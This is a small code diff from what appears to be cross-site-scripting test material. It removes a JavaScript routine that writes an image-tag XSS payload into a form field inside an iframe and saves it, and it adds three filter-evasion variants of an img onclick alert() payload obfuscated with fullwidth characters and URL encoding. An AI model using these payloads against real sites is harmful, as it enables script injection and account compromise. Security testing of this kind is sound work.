@@ -1,10 +1,3 @@
-var frame = document.createElement("iframe");
-frame.addEventListener("load", function() {
-  setTimeout(function() {
-    frame.contentDocument.getElementById("firstname").value = '&lt;img src="q" onerror="alert(5555)"&gt;';
-    frame.contentDocument.getElementsByClassName("save")[0].click();
-    setTimeout(function() {
-      console.log("CHANGED!");
-    }, 2000);
-  }, 1000);
-});
+＜img+onclick%3d"alert(1)"＜/img＞
+<img+onclick%3d"alert(1)"</img>
+%22%2F%3E%3cimg%2bonclick%253d%22alert%603%60%22%3C%2Fimg%3E
